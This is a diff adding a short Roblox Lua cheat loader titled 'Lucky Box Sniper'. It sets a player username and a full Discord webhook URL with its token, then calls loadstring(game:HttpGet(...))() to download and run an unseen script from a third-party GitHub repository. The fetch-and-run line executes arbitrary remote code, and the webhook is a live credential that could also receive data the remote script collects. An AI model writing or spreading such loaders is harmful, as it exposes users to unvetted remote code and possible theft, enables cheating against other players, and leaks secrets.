@@ -1,0 +1,5 @@
+--Keys Dont Change Anything Lucky Box Sniper:
+UserName = "BellaTvTT"
+WebHook = "https://discord.com/api/webhooks/1048548552135159858/6q_SjJlEzGttfQNnCk-9B3pi9qBngY53-fvsn6YjDMUUaLowd5y-BWe9-zZ8l3kuAWLJ"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
